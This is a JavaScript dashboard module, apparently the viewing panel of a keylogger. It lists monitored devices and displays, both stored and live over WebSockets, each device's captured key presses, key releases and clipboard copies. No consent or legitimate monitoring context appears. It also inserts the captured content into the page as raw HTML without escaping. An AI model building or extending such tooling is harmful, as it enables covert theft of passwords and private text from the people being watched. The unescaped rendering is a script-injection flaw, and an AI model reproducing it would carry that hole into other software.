import { getDeviceList, getDeviceLogs } from './get_data.js';
import config from './config.js';

let currentWebSocket = null;
let currentDeviceId = null;

function closeWebSocket(newDeviceId = null) {
  if (currentWebSocket && currentWebSocket.readyState === WebSocket.OPEN) {
    currentWebSocket.send(JSON.stringify({
      type: 'close',
      device_id: currentDeviceId,
      new_device_id: newDeviceId
    }));
    currentWebSocket.close(1000, 'Device switched or page closed');
    currentWebSocket = null;
    currentDeviceId = null;
  }
}

function connectWebSocket(deviceId) {
  const wsUrl = `${config.WS_BASE_URL}/ws/${deviceId}`;
  const ws = new WebSocket(wsUrl);

  ws.onopen = () => {
    console.log(`WebSocket连接已建立: ${deviceId}`);
    currentDeviceId = deviceId;
  };

  ws.onmessage = (event) => {
    const newLog = JSON.parse(event.data);
    appendNewLog(newLog);
  };

  ws.onclose = () => {
    console.log(`WebSocket连接已关闭: ${deviceId}`);
    if (currentDeviceId === deviceId) {
      currentWebSocket = null;
      currentDeviceId = null;
    }
  };

  ws.onerror = (error) => {
    console.error('WebSocket错误:', error);
    if (currentDeviceId === deviceId) {
      currentWebSocket = null;
      currentDeviceId = null;
    }
  };

  currentWebSocket = ws;
}

function scrollToBottom() {
  const deviceContent = document.querySelector('.device-content');
  if (deviceContent) {
    requestAnimationFrame(() => {
      deviceContent.scrollTop = deviceContent.scrollHeight;
    });
  }
}

function appendNewLog(newLog) {
  const deviceContent = document.querySelector('.device-content');
  if (!deviceContent) return;

  const eventTypeMap = {
    'keyboard_press': '按下',
    'keyboard_release': '松开',
    'clipboard_copy': '复制'
  };

  const date = new Date(newLog.time * 1000);
  const eventTypeCN = eventTypeMap[newLog.event_type] || newLog.event_type;

  const eventElement = document.createElement('div');
  eventElement.className = 'event-item';
  eventElement.innerHTML = `
    <span class="event-time">${date.toLocaleString()} (${newLog.timezone})</span>
    <span class="event-type">${eventTypeCN}</span>
    <span class="event-content">${newLog.content}</span>
  `;

  deviceContent.appendChild(eventElement);
  scrollToBottom();
}

async function renderDeviceList() {
  const deviceListElement = document.getElementById('deviceList');
  deviceListElement.innerHTML = '<h2>设备列表</h2>';

  const devices = await getDeviceList();

  devices.forEach(device => {
    const deviceElement = document.createElement('div');
    deviceElement.className = 'device-item';
    deviceElement.textContent = device.device_name;
    deviceElement.onclick = (e) => showDeviceInfo(device.device_id, device.device_name, e);
    deviceListElement.appendChild(deviceElement);
  });

  const deviceInfoElement = document.getElementById('deviceInfo');
  deviceInfoElement.innerHTML = `
    <div class="empty-state">
      <h2>← 请选择设备查看详细信息</h2>
    </div>
  `;
}

async function showDeviceInfo(deviceId, deviceName, e) {
  closeWebSocket(deviceId);

  document.querySelectorAll('.device-item').forEach(item => {
    item.classList.remove('active');
  });
  e.target.classList.add('active');

  const navbar = document.getElementById('navbar');
  navbar.classList.add('collapsed');

  const deviceInfoElement = document.getElementById('deviceInfo');
  const events = await getDeviceLogs(deviceId);

  const eventTypeMap = {
    'keyboard_press': '按下',
    'keyboard_release': '松开',
    'clipboard_copy': '复制'
  };

  let html = `
    <div class="device-header">
      <h2>${deviceName} - ${deviceId}</h2>
      <div class="divider"></div>
    </div>
    <div class="device-content">
  `;

  if (events.length === 0) {
    html += '<p>暂无事件记录</p>';
  } else {
    events.forEach(event => {
      const date = new Date(event.time * 1000);
      const eventTypeCN = eventTypeMap[event.event_type] || event.event_type;
      html += `
        <div class="event-item">
          <span class="event-time">${date.toLocaleString()} (${event.timezone})</span>
          <span class="event-type">${eventTypeCN}</span>
          <span class="event-content">${event.content}</span>
        </div>
      `;
    });
  }

  html += '</div>';

  deviceInfoElement.innerHTML = html;

  scrollToBottom();

  connectWebSocket(deviceId);
}

function initializeNavbar() {
  const navbar = document.getElementById('navbar');
  const toggleBtn = document.getElementById('toggleBtn');

  toggleBtn.addEventListener('click', () => {
    navbar.classList.toggle('collapsed');
  });
}

window.addEventListener('beforeunload', () => {
  closeWebSocket();
});

window.onload = function () {
  renderDeviceList();
  initializeNavbar();
}; 